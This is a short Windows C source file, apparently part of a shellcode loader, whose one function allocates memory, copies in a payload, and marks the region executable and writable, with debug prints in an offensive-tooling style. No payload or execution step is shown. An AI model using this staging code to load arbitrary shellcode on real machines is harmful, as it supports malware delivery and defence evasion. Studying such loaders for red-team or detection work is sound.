#include "payload_loading.h"

BOOL WritePayloadInMemory(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {
    DWORD dwOldProtection = 0;

    // Allocate memory for the payload
    *pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*pAddress == NULL) {
        DebugPrint("[!] VirtualAlloc Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    // Copy the payload to the allocated memory
    memcpy(*pAddress, pPayload, sPayloadSize);
    DebugPrint("[+] Payload written to memory at: 0x%p (%d bytes)\n", *pAddress, sPayloadSize);

    // Change memory protection to executable
    if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        DebugPrint("[!] VirtualProtect Failed With Error: %d \n", GetLastError());
        VirtualFree(*pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    return TRUE;
}
